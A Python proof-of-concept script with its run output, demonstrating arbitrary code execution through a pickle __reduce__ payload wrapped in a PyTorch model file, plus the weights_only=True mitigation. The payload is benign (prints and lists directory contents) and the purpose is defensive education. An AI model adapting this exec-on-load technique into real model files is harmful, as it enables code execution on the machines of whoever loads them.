"""
================================================================================
SECURITY DEMONSTRATION: PyTorch Model Loading Vulnerability
================================================================================

WARNING: This code demonstrates a critical security vulnerability.
NEVER load PyTorch models from untrusted sources without using weights_only=True.

This vulnerability affects all versions of PyTorch and allows arbitrary code
execution when loading untrusted model files.

Author: Security Research
Date: 2024
================================================================================
"""

import os
import sys
import pickle
import zipfile
import tempfile
from pathlib import Path
import shutil

import torch
import torch.nn as nn
import torch.nn.functional as F


# ==============================================================================
# 1. Define a benign PyTorch model (completely safe by itself)
# ==============================================================================
class BenignModel(nn.Module):
    """
    A simple CNN model - completely harmless when used normally.
    The danger comes from how it's serialized/deserialized.
    """
    def __init__(self):
        super().__init__()
        self.conv1 = nn.Conv2d(3, 6, 5)
        self.pool = nn.MaxPool2d(2, 2)
        self.conv2 = nn.Conv2d(6, 16, 5)
        self.fc1 = nn.Linear(16 * 5 * 5, 120)
        self.fc2 = nn.Linear(120, 84)
        self.fc3 = nn.Linear(84, 10)

    def forward(self, x):
        x = self.pool(F.relu(self.conv1(x)))
        x = self.pool(F.relu(self.conv2(x)))
        x = x.view(-1, 16 * 5 * 5)
        x = F.relu(self.fc1(x))
        x = F.relu(self.fc2(x))
        x = self.fc3(x)
        return x


# ==============================================================================
# 2. The vulnerability: Python's pickle module can execute arbitrary code
# ==============================================================================
class MaliciousPickle:
    """
    This class demonstrates how pickle can be abused.
    The __reduce__ method defines what happens during unpickling.
    """
    def __reduce__(self):
        # This code will run when the object is unpickled
        malicious_code = (
            "print('\\n' + '='*60)\n"
            "print('🔴 MALICIOUS CODE EXECUTED!')\n"
            "print('='*60)\n"
            "import os\n"
            "print(f'Current directory: {os.getcwd()}')\n"
            "print('\\nDirectory contents:')\n"
            "for f in os.listdir('.'):\n"
            "    if os.path.isfile(f):\n"
            "        print(f'  📄 {f}')\n"
            "    else:\n"
            "        print(f'  📁 {f}/')\n"
            "print('='*60 + '\\n')"
        )
        # Return a tuple (callable, arguments) - this runs during unpickling
        return (exec, (malicious_code,))


def create_malicious_model(benign_model_path, output_path):
    """
    Injects malicious code into a benign PyTorch model file.

    This works because PyTorch models are just pickle files (or zip files
    containing pickle files). By manipulating the pickle data, we can
    inject code that runs when the model is loaded.
    """
    print(f"\n🔧 Creating malicious model: {output_path}")

    # Read the benign model file
    with open(benign_model_path, 'rb') as f:
        benign_data = f.read()

    # Create a malicious wrapper that will execute code when unpickled
    # The wrapper contains the benign data and will return it after execution
    malicious_obj = {
        '__benign_data__': benign_data,
        '__malicious_payload__': MaliciousPickle()
    }

    # Save the malicious object
    with open(output_path, 'wb') as f:
        pickle.dump(malicious_obj, f)

    print("   ✅ Malicious model created successfully")


def demonstrate_vulnerability():
    """
    Main demonstration function showing:
    1. Creating a benign model
    2. Injecting malicious code
    3. Loading the malicious model (vulnerable way)
    4. Loading safely with weights_only=True
    """

    print("=" * 70)
    print("🔐 PYTORCH MODEL LOADING SECURITY DEMONSTRATION")
    print("=" * 70)
    print("\n📋 This demo shows how loading untrusted PyTorch models")
    print("   can lead to arbitrary code execution.")
    print("\n⚠️  WARNING: This is a REAL vulnerability that affects")
    print("   all versions of PyTorch. Always use weights_only=True!")

    # --------------------------------------------------------------------------
    # Step 1: Create a benign model (completely safe)
    # --------------------------------------------------------------------------
    print("\n" + "-" * 70)
    print("STEP 1: Creating a benign PyTorch model")
    print("-" * 70)

    model = BenignModel()
    benign_path = Path("benign_model.pkl")
    torch.save(model, benign_path)
    print(f"✅ Benign model saved to: {benign_path}")
    print(f"   Model type: {type(model).__name__}")
    print(f"   File size: {benign_path.stat().st_size} bytes")

    # Verify it loads safely
    test_load = torch.load(benign_path, weights_only=False)
    print(f"✅ Model loads correctly: {type(test_load).__name__}")

    # --------------------------------------------------------------------------
    # Step 2: Create a malicious version (injected with code)
    # --------------------------------------------------------------------------
    print("\n" + "-" * 70)
    print("STEP 2: Creating a malicious model (injected with code)")
    print("-" * 70)

    malicious_path = Path("malicious_model.pkl")
    create_malicious_model(benign_path, malicious_path)

    # --------------------------------------------------------------------------
    # Step 3: Demonstrate the vulnerability (UNSAFE loading)
    # --------------------------------------------------------------------------
    print("\n" + "-" * 70)
    print("STEP 3: DEMONSTRATING VULNERABILITY - Loading with weights_only=False")
    print("-" * 70)
    print("🔴 THIS IS UNSAFE! The following code will execute during loading:")
    print("    - Directory listing")
    print("    - File enumeration")
    print("\n🚨 Loading malicious model...\n")

    try:
        # This will execute the malicious code during loading
        loaded_model = torch.load(malicious_path, weights_only=False)
        print(f"\n✅ Model loaded: {type(loaded_model).__name__}")
    except Exception as e:
        print(f"\n⚠️  Note: {e}")
        print("   The payload still executed before this error!")

    # --------------------------------------------------------------------------
    # Step 4: Show the safe way (weights_only=True)
    # --------------------------------------------------------------------------
    print("\n" + "-" * 70)
    print("STEP 4: SAFE USAGE - Loading with weights_only=True")
    print("-" * 70)
    print("✅ This is the secure way to load models")
    print("   weights_only=True prevents code execution\n")

    try:
        # This prevents code execution
        loaded_model = torch.load(malicious_path, weights_only=True)
        print("❌ This should not happen - safe loading should fail")
    except Exception as e:
        print("✅ Safe loading prevented execution!")
        print(f"   Error message: {type(e).__name__}")
        print("   This is GOOD - the payload was blocked")

    # --------------------------------------------------------------------------
    # Summary and recommendations
    # --------------------------------------------------------------------------
    print("\n" + "=" * 70)
    print("📊 DEMONSTRATION SUMMARY")
    print("=" * 70)
    print("""
✅ KEY FINDINGS:
   • PyTorch models can execute arbitrary code when loaded
   • This affects ALL versions of PyTorch
   • The vulnerability exists in both .pt and .pkl formats
   • weights_only=True completely prevents this attack

🔬 TECHNICAL EXPLANATION:
   PyTorch uses Python's pickle module for serialization. Pickle is
   inherently unsafe - it can execute arbitrary code during unpickling.
   Any file loaded with pickle (including PyTorch models) can potentially
   run malicious code.

🛡️ MITIGATION STEPS:
   1. ALWAYS use weights_only=True when loading models
   2. Only load models from trusted sources
   3. Verify model integrity (checksums, signatures)
   4. Consider using safe formats like ONNX for untrusted models

📚 REFERENCES:
   • PyTorch Security: https://pytorch.org/docs/stable/notes/serialization.html
   • Pickle Security: https://docs.python.org/3/library/pickle.html
    """)

    # Clean up
    print("\n🧹 Cleaning up demonstration files...")
    benign_path.unlink()
    malicious_path.unlink()
    print("✅ Cleanup complete")


if __name__ == "__main__":
    demonstrate_vulnerability()

"""
======================================================================
🔐 PYTORCH MODEL LOADING SECURITY DEMONSTRATION
======================================================================

📋 This demo shows how loading untrusted PyTorch models
   can lead to arbitrary code execution.

⚠️  WARNING: This is a REAL vulnerability that affects
   all versions of PyTorch. Always use weights_only=True!

----------------------------------------------------------------------
STEP 1: Creating a benign PyTorch model
----------------------------------------------------------------------
✅ Benign model saved to: benign_model.pkl
   Model type: BenignModel
   File size: 254101 bytes
✅ Model loads correctly: BenignModel

----------------------------------------------------------------------
STEP 2: Creating a malicious model (injected with code)
----------------------------------------------------------------------

🔧 Creating malicious model: malicious_model.pkl
   ✅ Malicious model created successfully

----------------------------------------------------------------------
STEP 3: DEMONSTRATING VULNERABILITY - Loading with weights_only=False
----------------------------------------------------------------------
🔴 THIS IS UNSAFE! The following code will execute during loading:
    - Directory listing
    - File enumeration

🚨 Loading malicious model...


============================================================
🔴 MALICIOUS CODE EXECUTED!
============================================================
Current directory: /content

Directory contents:
  📁 .config/
  📄 pytorch_standard_model.pkl
  📄 benign_model.zip
  📄 pytorch_standard_model.zip
  📄 benign_model.pkl
  📄 malicious_model.zip
  📄 malicious_model.pkl
  📄 pytorch_exfil_poc.zip
  📄 pytorch_exfil_poc.pkl
  📁 sample_data/
============================================================


⚠️  Note: Invalid magic number; corrupt file?
   The payload still executed before this error!

----------------------------------------------------------------------
STEP 4: SAFE USAGE - Loading with weights_only=True
----------------------------------------------------------------------
✅ This is the secure way to load models
   weights_only=True prevents code execution

✅ Safe loading prevented execution!
   Error message: UnpicklingError
   This is GOOD - the payload was blocked

======================================================================
📊 DEMONSTRATION SUMMARY
======================================================================

✅ KEY FINDINGS:
   • PyTorch models can execute arbitrary code when loaded
   • This affects ALL versions of PyTorch
   • The vulnerability exists in both .pt and .pkl formats
   • weights_only=True completely prevents this attack

🔬 TECHNICAL EXPLANATION:
   PyTorch uses Python's pickle module for serialization. Pickle is 
   inherently unsafe - it can execute arbitrary code during unpickling.
   Any file loaded with pickle (including PyTorch models) can potentially
   run malicious code.

🛡️ MITIGATION STEPS:
   1. ALWAYS use weights_only=True when loading models
   2. Only load models from trusted sources
   3. Verify model integrity (checksums, signatures)
   4. Consider using safe formats like ONNX for untrusted models

📚 REFERENCES:
   • PyTorch Security: https://pytorch.org/docs/stable/notes/serialization.html
   • Pickle Security: https://docs.python.org/3/library/pickle.html
    

🧹 Cleaning up demonstration files...
✅ Cleanup complete
/usr/local/lib/python3.12/dist-packages/torch/_weights_only_unpickler.py:588: UserWarning: Detected pickle protocol 4 in the checkpoint, which was not the default pickle protocol used by `torch.load` (2). The weights_only Unpickler might not support all instructions implemented by this protocol, please file an issue for adding support if you encounter this.
  return Unpickler(file, encoding=encoding).load()

"""    